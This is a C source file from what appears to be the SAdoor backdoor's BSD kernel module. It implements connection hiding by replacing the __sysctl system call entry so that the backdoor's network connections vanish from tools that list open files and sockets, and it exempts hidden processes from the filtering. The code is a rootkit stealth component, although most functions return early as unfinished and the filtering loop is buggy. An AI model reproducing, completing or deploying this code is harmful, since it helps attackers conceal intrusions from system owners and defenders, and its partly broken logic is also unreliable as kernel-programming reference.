/*
 *  File: hide_conns.c
 *  Description: Connection hiding routines
 *  Version: 1.0 
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Date: Thu Jul 24 11:41:39 CEST 2003
 *
 *  Copyright (c) 2002 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include <sys/param.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <sys/proc.h>
#include <sys/sysctl.h>
#include <sys/syscall.h>
#include <sys/unistd.h>
#include "sadoor.h"

#ifdef SAKMOD_HIDE_CONNECTION

/* Private functions */
#ifndef SAKMOD_HIDE_PROCS
static int hide_conns_sysctl(struct proc *, void *, register_t *);
#endif /* SAKMOD_HIDE_PROCS */
static int hide_cons_ishidden(uint32_t, uint16_t);

/* Saved function pointers */
#ifndef SAKMOD_HIDE_PROCS
static sy_call_t *saved_sysctl_sycall;
#endif /* SAKMOD_HIDE_PROCS */

/* The double linked list of hidden connections */
static struct hidden_conn *hconn = NULL;

/*
 * Hide SAdoor connections.
 * We only look for source sockets, i.e the clients ip and port
 * when hiding, it should be enough.
 */
void
hide_conns(void)
{
	log(1, "Hiding of connections not yet implemented\n");
	return;

#ifndef SAKMOD_HIDE_PROCS
    int s;
    
    splhigh();
        /* Save and replace SYS___sysctl */
        debug(3, "Replacing sysctl\n");
        saved_sysctl_sycall = sysent[SYS___sysctl].sy_call;
        sysent[SYS___sysctl].sy_call = hide_conns_sysctl;
    splx(s);
#endif /* SAKMOD_HIDE_PROCS */
}


/*
 * Add a connecion to the list of hidden connections.
 */
void
hide_conns_addconn(uint32_t srcip, uint16_t srcport)
{
    struct hidden_conn *tmp;
    struct hidden_conn *last = hconn;
    struct in_addr ia;
    
return;
	
    tmp = (struct hidden_conn *)kspace_calloc(sizeof(struct hidden_conn));
    tmp->srcip = srcip;
    tmp->srcport = srcport;
    tmp->next = NULL;
    tmp->prev = NULL;

    last = hconn;
    
    /* First entry */
    if (last == NULL) 
        hconn = tmp;
        
    /* Find last entry */
    else {
        
        while (last->next != NULL)
            last = last->next;

        last->next = tmp;
        last->next->prev = last;
    }

    ia.s_addr = srcip;
    debug(2, "Added connection to %s:%u to hidden-list\n", 
        inet_ntoa(ia), ntohs(srcport));
}

/*
 * Remove a connection from the list of hidden connections.
 */
void
hide_conns_delconn(uint32_t srcip, uint16_t srcport)
{
    struct hidden_conn *tmp = hconn;

return;

    if (tmp == NULL)
        return;

    while (tmp != NULL) {
        
        if ((tmp->srcip == srcip) && (tmp->srcport == srcport)) {
            
            if (SAKMOD_DEBUG >= 2) {
                struct in_addr id;

                id.s_addr = srcip;
                debug(2, "Removing connection to %s:%u from hidden-list\n",
                    inet_ntoa(id), ntohs(srcport));
            }
            
            if (tmp->prev != NULL)
                tmp->prev->next = tmp->next;

            if (tmp->next != NULL)
                tmp->next->prev = tmp->prev;
            
            if (hconn == tmp) {
                debug(3, "Hidden connection list empty\n");
                hconn = NULL;
            }
            
            kspace_free(tmp);
            return;
        }
    
        tmp = tmp->next;
    }
}

/*
 * Restore the replaced functions
 */
void
hide_conns_restore(void)
{
return;

#ifndef SAKMOD_HIDE_PROCS
    int s;

    splhigh();
        /* Restore sysctl */
        debug(3, "Restoring sysctl\n");
        sysent[SYS___sysctl].sy_call = saved_sysctl_sycall;    
    splx(s);
#endif /* SAKMOD_HIDE_PROCS */
}

/*
 * If SAKMOD_HIDE_PROCS is defined, this function is called
 * from hide_procs_sysctl(), which is the "new" __sysctl function.
 * Otherwise we replace the real __sysctl function with this.
 */
int
hide_conns_sysctl(struct proc *p, void *arg, register_t *retval)
{
    struct sys___sysctl_args *uap;
	u_char *buf;             /* Kernel space buffer */
	struct filelist *fhead;  /* Filelist header pointer */
	struct file *fp;         /* File entry pointer */
	struct socket *so;  
    size_t size;             /* Size to return */
    size_t newsize;
    int i;
	int numfiles;
    int mib[4];
    int error;                /* Return value from real sysctl function */


#ifndef SAKMOD_HIDE_PROCS
    /* Call the real sysctl function */
    if ( (error = saved_sysctl_sycall(p, arg, retval))) {
        debug(3, "hide_conns_sysctl(): Real sysctl returned error (%d)\n", retval);
        return(error);
    }
#else
    debug(2, "hide_conns_sysctl(): Got call from hide_procs_sysctl()\n");

    /* hide_procs_sysctl() checks this for us */
    error = 0;
#endif /* SAKMOD_HIDE_PROCS */

    uap = (struct sys___sysctl_args *)arg;

    /* Copy mib from userspace */
    copyin(SCARG(uap, name), mib, sizeof(mib));

     /* Get the returned size */
    copyin(SCARG(uap, oldlenp), &size, sizeof(size));
    newsize = size;

    /* No need to continue if it's not a request for connections */
    if ((mib[0] != CTL_KERN) || (mib[1] != KERN_FILE))
        return(error);

#ifdef SAKMOD_UNHIDE_FOR_HIDDEN_PROC
    /* The request came from a hidden process, do not hide anything */
    if (p->p_flag & SAKMOD_HIDDEN_PROC_FLAG) {
        debug(2, "hide_conns_sysctl(): Request from hidden process, returning all\n");
        return(error);
    }
#endif /* SAKMOD_UNHIDE_FOR_HIDDEN_PROC */

	/* Copy in */
	buf = kspace_calloc(size);
	(void)copyin(SCARG(uap, old), buf, size);

	fhead = (struct filelist *)buf;
	fp = (struct file *)(buf + sizeof(struct filelist));
	numfiles = (size - sizeof(struct filelist))/sizeof(struct file);

	/* Traverse the list of received files 
	 * and remove the hidden connection(s) */
	for(i = 0; i*sizeof(struct file) < numfiles; i++) {
	
		so = (struct socket *)fp->f_data;
	
		/* Is it a hidden connection ? */
		if (fp->f_type == DTYPE_SOCKET) {
	
			so = (struct socket *)fp->f_data;

			/* Overlap the hidden file/connection */
			bcopy(fp + 1, fp, (numfiles - (i+1))*sizeof(struct file));
			
			newsize -= sizeof(struct file);
		
			/* We don't want to miss checking 
			 * the overlapping file */
			i--;
		}
		else
			fp++;
	}

	(void)copyout(buf, SCARG(uap, old), newsize);
	kspace_free(buf);
	return(copyout(&newsize, SCARG(uap, oldlenp), sizeof(newsize)));

/*
    n_data = (struct xinpgen *)kspace_calloc(size);    
    (void)copyin(SCARG(uap, old), n_data, size);
    n_ptr = n_data;
    
    if(sizeof(struct xinpgen) < size)
        n_ptr = (struct xinpgen *)((char *)n_ptr + sizeof(struct xinpgen));

    for(i = size; i > 0; i -= sizeof(struct xtcpcb)) {

        inp = &((struct xtcpcb *)n_ptr)->xt_inp;
        so = &((struct xtcpcb *)n_ptr)->xt_socket;

        if (hide_cons_ishidden(inp->inp_faddr.s_addr, inp->inp_fport)) {
            debug(2, "Hiding request for info on connection to %s:%u\n", 
                inet_ntoa(inp->inp_faddr), ntohs(inp->inp_fport));
        
            newsize -= sizeof(struct xtcpcb);

            if ((i - sizeof(struct xtcpcb)) > 0)
                bcopy((char *)n_ptr + sizeof(struct xtcpcb), n_ptr, 
                    (i - sizeof(struct xtcpcb)));
        }

        if ((i - sizeof(struct xtcpcb)) > 0)
            n_ptr = (struct xinpgen *)((char *)n_ptr + sizeof(struct xtcpcb));
    }

    copyout(n_data, SCARG(uap, old), newsize);
    kspace_free(n_data);
    return(copyout(&newsize, SCARG(uap, oldlenp), sizeof(newsize)));
	*/

}

/*
 * Returns 1 if connection is hidden, 0 otherwise;
 */
static int
hide_cons_ishidden(uint32_t srcip, uint16_t srcport)
{
    struct hidden_conn *tmp = hconn;
    struct in_addr ipa;

    ipa.s_addr = srcip;
    debug(2, "Searching for hidden connection from %s:%u\n", 
        inet_ntoa(ipa), ntohs(srcport));

    if (tmp == NULL)
        return(0);

    while (tmp != NULL) {

        if ((tmp->srcip == srcip) && (tmp->srcport == srcport)) {
            debug(2, "Found hidden connection %s:%u in list\n", 
                inet_ntoa(ipa), ntohs(srcport));
            return(1);
        }

        tmp = tmp->next;
    }

    return(0);
}
 

#endif /* SAKMOD_HIDE_CONNECTION */
